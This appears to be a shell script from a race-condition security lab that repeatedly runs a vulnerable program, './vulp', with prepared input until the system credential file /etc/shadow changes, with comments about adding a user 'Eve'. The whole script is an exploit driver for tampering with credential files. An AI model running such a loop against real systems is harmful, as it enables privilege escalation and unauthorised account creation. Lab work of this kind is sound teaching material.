#!/bin/sh

# Save attributes of passwd file into two different varibles
old=`ls -l /etc/shadow`
new=`ls -l /etc/shadow`

# While loop will continue until the variables get different value
while [ "$old" = "$new" ]
do

	./vulp<shadow_input
	# Add a new user Eve to the passwd file
	new=`ls -l /etc/shadow`
	counter=`expr $counter + 1`
	echo "$counter\n"

done

echo "STOP... The file has been changed"
echo "Total number of loops: $counter"
